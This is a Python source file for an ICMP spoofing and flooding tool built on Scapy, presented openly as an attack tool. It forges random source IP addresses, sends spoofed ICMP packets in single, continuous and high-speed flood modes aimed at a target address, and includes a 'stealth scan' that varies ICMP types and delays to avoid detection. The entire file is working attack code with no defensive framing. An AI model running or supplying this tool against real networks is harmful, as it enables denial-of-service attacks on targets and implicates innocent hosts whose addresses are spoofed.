#!/usr/bin/env python3
"""
ICMP Spoofer
============

Advanced ICMP packet spoofing tool with real-time attack monitoring.
"""

import sys
import argparse
import time
import threading
from faker import Faker
from colorama import init, Fore, Style

try:
    from scapy.all import IP, ICMP, send, sr1, sniff
except ImportError:
    print("Error: Scapy not installed. Please run: pip install scapy")
    sys.exit(1)

init(autoreset=True)

class ICMPSpoofer:
    """Advanced ICMP packet spoofing class"""
    
    def __init__(self):
        self.fake = Faker()
        self.attack_stats = {
            'packets_sent': 0,
            'responses_received': 0,
            'bytes_sent': 0
        }
        self.monitoring = False
    
    def show_banner(self):
        """Display attack banner"""
        print(f"{Fore.RED}{Style.BRIGHT}")
        print("██████╗ ██████╗  ██████╗  ██████╗ ███████╗")
        print("██╔══██╗██╔═══██╗██╔═══██╗██╔════╝ ██╔════╝")
        print("███████║██║   ██║██║   ██║█████╗   █████╗  ")
        print("██╔══██║██║   ██║██║   ██║██╔══╝   ██╔══╝  ")
        print("██║  ██║╚██████╔╝╚██████╔╝██║      ██║     ")
        print("╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝      ╚═╝     ")
        print("         ICMP SPOOFING ATTACK")
        print(f"{Style.RESET_ALL}")
    
    def display_live_stats(self):
        """Display live attack statistics"""
        while self.monitoring:
            print(f"\r{Fore.CYAN}📊 LIVE: {self.attack_stats['packets_sent']} packets | {self.attack_stats['responses_received']} responses | {self.attack_stats['bytes_sent']} bytes", end='', flush=True)
            time.sleep(0.5)
    
    def packet_monitor(self, target_ip, duration=30):
        """Monitor for responses and other ICMP traffic"""
        def packet_handler(packet):
            if packet.haslayer(ICMP):
                if packet[IP].src == target_ip:
                    self.attack_stats['responses_received'] += 1
                    print(f"\n{Fore.GREEN}📥 RESPONSE: {packet[IP].src} → {packet[IP].dst} (Type: {packet[ICMP].type})")
        
        sniff(filter=f"icmp and host {target_ip}", prn=packet_handler, timeout=duration)
    
    def send_spoofed_icmp(self, target_ip, source_ip=None, icmp_type=8, 
                         icmp_code=0, count=1, delay=1, payload="", continuous=False):
        """Send spoofed ICMP packets with real-time monitoring"""
        
        if not source_ip:
            source_ip = self.fake.ipv4()
        
        self.show_banner()
        print(f"{Fore.YELLOW}🎯 TARGET: {target_ip}")
        print(f"{Fore.YELLOW}🔀 SPOOFED SOURCE: {source_ip}")
        print(f"{Fore.YELLOW}📋 ICMP TYPE: {icmp_type}")
        print(f"{Fore.YELLOW}📊 MODE: {'CONTINUOUS' if continuous else f'{count} packets'}")
        print()
        
        # Start monitoring
        self.monitoring = True
        stats_thread = threading.Thread(target=self.display_live_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start packet monitor
        monitor_thread = threading.Thread(target=self.packet_monitor, args=(target_ip, count * delay + 30))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            if continuous:
                print(f"{Fore.RED}🔥 CONTINUOUS ATTACK MODE - Press Ctrl+C to stop")
                packet_count = 0
                while True:
                    packet = self.craft_packet(source_ip, target_ip, icmp_type, icmp_code, payload)
                    send(packet, verbose=0)
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(packet)
                    packet_count += 1
                    
                    if packet_count % 10 == 0:
                        print(f"\n{Fore.MAGENTA}⚡ Sent {packet_count} packets...")
                    
                    time.sleep(delay)
            else:
                for i in range(count):
                    packet = self.craft_packet(source_ip, target_ip, icmp_type, icmp_code, payload)
                    send(packet, verbose=0)
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(packet)
                    
                    if i < count - 1:
                        time.sleep(delay)
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️  Attack stopped by user")
        
        finally:
            self.monitoring = False
            time.sleep(1)
            self.show_final_stats()
    
    def craft_packet(self, source_ip, target_ip, icmp_type, icmp_code, payload):
        """Craft spoofed ICMP packet"""
        if payload:
            return IP(src=source_ip, dst=target_ip) / ICMP(type=icmp_type, code=icmp_code) / payload
        else:
            return IP(src=source_ip, dst=target_ip) / ICMP(type=icmp_type, code=icmp_code)
    
    def show_final_stats(self):
        """Display final attack statistics"""
        print(f"\n\n{Fore.CYAN}📊 ATTACK SUMMARY")
        print("=" * 40)
        print(f"📤 Packets sent: {self.attack_stats['packets_sent']}")
        print(f"📥 Responses received: {self.attack_stats['responses_received']}")
        print(f"📏 Total bytes sent: {self.attack_stats['bytes_sent']}")
        success_rate = (self.attack_stats['responses_received'] / max(1, self.attack_stats['packets_sent'])) * 100
        print(f"📈 Response rate: {success_rate:.1f}%")
        print("=" * 40)
    
    def flood_attack(self, target_ip, source_ip=None, duration=30):
        """High-speed ICMP flood attack"""
        if not source_ip:
            source_ip = self.fake.ipv4()
        
        print(f"{Fore.RED}💥 ICMP FLOOD ATTACK")
        print(f"🎯 Target: {target_ip}")
        print(f"🔀 Source: {source_ip}")
        print(f"⏱️  Duration: {duration}s")
        print(f"{Fore.YELLOW}🔥 High-speed flood mode activated!")
        print()
        
        self.monitoring = True
        stats_thread = threading.Thread(target=self.display_live_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                # Rapid fire mode - no delay
                for _ in range(10):  # Send 10 packets per iteration
                    packet = IP(src=source_ip, dst=target_ip) / ICMP()
                    send(packet, verbose=0)
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(packet)
                
                time.sleep(0.1)  # Brief pause to prevent overwhelming
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️  Flood attack stopped")
        
        finally:
            self.monitoring = False
            time.sleep(1)
            self.show_final_stats()
    
    def stealth_scan(self, target_ip, source_ip=None):
        """Stealthy ICMP scan with random delays"""
        if not source_ip:
            source_ip = self.fake.ipv4()
        
        print(f"{Fore.BLUE}🥷 STEALTH ICMP SCAN")
        print(f"🎯 Target: {target_ip}")
        print(f"🔀 Source: {source_ip}")
        print("🕐 Using random delays to avoid detection")
        print()
        
        icmp_types = [8, 13, 17, 37]  # Different ICMP types for stealth
        
        for i, icmp_type in enumerate(icmp_types):
            delay = self.fake.random_int(1, 5)  # Random delay
            print(f"📤 Sending ICMP type {icmp_type} (delay: {delay}s)")
            
            packet = IP(src=source_ip, dst=target_ip) / ICMP(type=icmp_type)
            send(packet, verbose=0)
            self.attack_stats['packets_sent'] += 1
            
            if i < len(icmp_types) - 1:
                time.sleep(delay)
        
        print(f"{Fore.GREEN}✅ Stealth scan completed")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Advanced ICMP Spoofing Tool")
    
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('--source', '-s', help='Source IP to spoof')
    parser.add_argument('--type', '-t', type=int, default=8, help='ICMP type (default: 8)')
    parser.add_argument('--code', '-c', type=int, default=0, help='ICMP code (default: 0)')
    parser.add_argument('--count', '-n', type=int, default=1, help='Number of packets')
    parser.add_argument('--delay', '-d', type=float, default=1.0, help='Delay between packets')
    parser.add_argument('--payload', '-p', default='', help='Custom payload')
    parser.add_argument('--continuous', action='store_true', help='Continuous attack mode')
    parser.add_argument('--flood', action='store_true', help='High-speed flood attack')
    parser.add_argument('--stealth', action='store_true', help='Stealth scan mode')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration for flood mode')
    
    args = parser.parse_args()
    
    # Check root privileges
    if os.geteuid() != 0:
        print(f"{Fore.RED}❌ Root privileges required")
        print(f"{Fore.YELLOW}💡 Run with: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
        sys.exit(1)
    
    spoofer = ICMPSpoofer()
    
    if args.flood:
        spoofer.flood_attack(args.target, args.source, args.duration)
    elif args.stealth:
        spoofer.stealth_scan(args.target, args.source)
    else:
        spoofer.send_spoofed_icmp(
            target_ip=args.target,
            source_ip=args.source,
            icmp_type=args.type,
            icmp_code=args.code,
            count=args.count,
            delay=args.delay,
            payload=args.payload,
            continuous=args.continuous
        )

if __name__ == "__main__":
    import os
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️  Terminated by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}")
        sys.exit(1) 